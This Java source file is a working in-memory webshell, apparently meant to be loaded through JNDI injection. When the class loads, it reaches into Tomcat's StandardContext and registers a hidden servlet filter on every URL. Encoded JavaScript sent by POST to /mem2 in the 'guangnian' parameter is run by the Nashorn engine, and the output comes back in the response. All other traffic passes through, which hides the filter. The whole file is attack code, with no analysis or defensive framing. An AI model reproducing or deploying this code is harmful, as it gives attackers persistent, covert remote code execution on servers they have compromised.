import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.StringWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Hashtable;

public class mem2 implements ObjectFactory {

    static {
        try {
            inject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) {
        return null;
    }

    static void inject() throws Exception {
        Object attrs = Class.forName("org.springframework.web.context.request.RequestContextHolder")
            .getMethod("currentRequestAttributes").invoke(null);
        Object request = attrs.getClass().getMethod("getRequest").invoke(attrs);
        Object servletContext = request.getClass().getMethod("getServletContext").invoke(request);

        Object stdCtx = getStandardContext(servletContext);
        ScriptEngine engine = getNashornEngine();

        ClassLoader webCL = Thread.currentThread().getContextClassLoader();
        Class<?> filterClz = Class.forName("javax.servlet.Filter", false, webCL);
        Class<?> sReqClz  = Class.forName("javax.servlet.ServletRequest", false, webCL);
        Class<?> sRespClz = Class.forName("javax.servlet.ServletResponse", false, webCL);
        Class<?> hReqClz  = Class.forName("javax.servlet.http.HttpServletRequest", false, webCL);
        Class<?> hRespClz = Class.forName("javax.servlet.http.HttpServletResponse", false, webCL);

        Object filterProxy = Proxy.newProxyInstance(
            filterClz.getClassLoader(),
            new Class[]{filterClz},
            new InvocationHandler() {
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if (!"doFilter".equals(method.getName())) return null;
                    Object req = args[0], res = args[1], chain = args[2];

                    try {
                        String uri = (String) hReqClz.getMethod("getRequestURI").invoke(req);
                        String httpMethod = (String) hReqClz.getMethod("getMethod").invoke(req);

                        // Only intercept POST /mem2, everything else passes through (native 404)
                        if (uri == null || !uri.endsWith("/mem2") || !"POST".equalsIgnoreCase(httpMethod)) {
                            chain.getClass().getMethod("doFilter", sReqClz, sRespClz)
                                .invoke(chain, req, res);
                            return null;
                        }

                        InputStream is = (InputStream) sReqClz.getMethod("getInputStream").invoke(req);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buf = new byte[4096];
                        int len;
                        while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
                        String body = baos.toString("UTF-8").trim();

                        String code = null, rawText = null;

                        if (!body.isEmpty()) {
                            for (String p : body.split("&")) {
                                if (p.startsWith("guangnian=")) {
                                    rawText = p.substring(10);
                                    try {
                                        String decoded = java.net.URLDecoder.decode(rawText, "UTF-8");
                                        try {
                                            code = new String(Base64.getDecoder().decode(decoded), "UTF-8");
                                            rawText = decoded;
                                        } catch (Exception ex) {
                                            code = new String(Base64.getDecoder().decode(rawText), "UTF-8");
                                        }
                                    } catch (Exception ex) {
                                        try {
                                            code = new String(Base64.getDecoder().decode(rawText), "UTF-8");
                                        } catch (Exception ex2) {
                                            code = rawText;
                                        }
                                    }
                                    break;
                                }
                            }
                        }

                        if (code == null && !body.isEmpty()) {
                            rawText = body;
                            try {
                                code = new String(Base64.getDecoder().decode(body), "UTF-8");
                            } catch (Exception ex) {
                                try {
                                    String decoded = java.net.URLDecoder.decode(body, "UTF-8");
                                    code = new String(Base64.getDecoder().decode(decoded), "UTF-8");
                                    rawText = decoded;
                                } catch (Exception ex2) {
                                    code = body;
                                }
                            }
                        }

                        if (code == null || code.isEmpty()) {
                            chain.getClass().getMethod("doFilter", sReqClz, sRespClz)
                                .invoke(chain, req, res);
                            return null;
                        }

                        StringWriter sw = new StringWriter();
                        if (engine != null) {
                            try {
                                engine.getContext().setWriter(sw);
                                engine.getContext().setErrorWriter(sw);
                                engine.eval(code);
                            } catch (Exception ex) {
                                sw.write("guangnian\nnashorn error: " + ex.getMessage());
                            }
                        } else {
                            sw.write("guangnian\nno nashorn engine");
                        }
                        String output = sw.toString();
                        if (!output.contains("guangnian")) output = "guangnian\n" + output;

                        hRespClz.getMethod("setStatus", int.class).invoke(res, 200);
                        hRespClz.getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                        Object w = hRespClz.getMethod("getWriter").invoke(res);
                        w.getClass().getMethod("write", String.class).invoke(w, output);
                        w.getClass().getMethod("flush").invoke(w);

                    } catch (Exception ex) {}
                    return null;
                }
            }
        );

        Class<?> filterDefClz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Object filterDef = filterDefClz.newInstance();
        filterDefClz.getMethod("setFilterName", String.class).invoke(filterDef, "mem2_guangnian");
        filterDefClz.getMethod("setFilterClass", String.class).invoke(filterDef, "mem2_guangnian");
        filterDefClz.getMethod("setFilter", filterClz).invoke(filterDef, filterProxy);
        stdCtx.getClass().getMethod("addFilterDef", filterDefClz).invoke(stdCtx, filterDef);

        Class<?> filterMapClz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Object filterMap = filterMapClz.newInstance();
        filterMapClz.getMethod("setFilterName", String.class).invoke(filterMap, "mem2_guangnian");
        filterMapClz.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
        stdCtx.getClass().getMethod("addFilterMapBefore", filterMapClz).invoke(stdCtx, filterMap);
        stdCtx.getClass().getMethod("filterStart").invoke(stdCtx);
    }

    static Object getStandardContext(Object servletContext) throws Exception {
        Class<?> stdCtxClass = Class.forName("org.apache.catalina.core.StandardContext");
        Object current = servletContext;
        for (int depth = 0; depth < 5 && current != null; depth++) {
            if (stdCtxClass.isAssignableFrom(current.getClass())) {
                return current;
            }
            Field contextField = null;
            for (Field f : current.getClass().getDeclaredFields()) {
                if (f.getName().equals("context")) {
                    contextField = f;
                    break;
                }
            }
            if (contextField != null) {
                contextField.setAccessible(true);
                current = contextField.get(current);
            } else {
                try {
                    current = current.getClass().getMethod("getParent").invoke(current);
                } catch (Exception e) {
                    break;
                }
            }
        }
        throw new Exception("Cannot find StandardContext");
    }

    static ScriptEngine getNashornEngine() {
        try {
            Class<?> fc = Class.forName("jdk.nashorn.api.scripting.NashornScriptEngineFactory");
            Object factory = fc.newInstance();
            return (ScriptEngine) fc.getMethod("getScriptEngine").invoke(factory);
        } catch (Exception e) {
            ScriptEngineManager mgr = new ScriptEngineManager();
            ScriptEngine eng = mgr.getEngineByName("nashorn");
            if (eng == null) eng = mgr.getEngineByName("js");
            if (eng == null) eng = mgr.getEngineByName("JavaScript");
            if (eng == null) eng = mgr.getEngineByName("Nashorn");
            return eng;
        }
    }
}
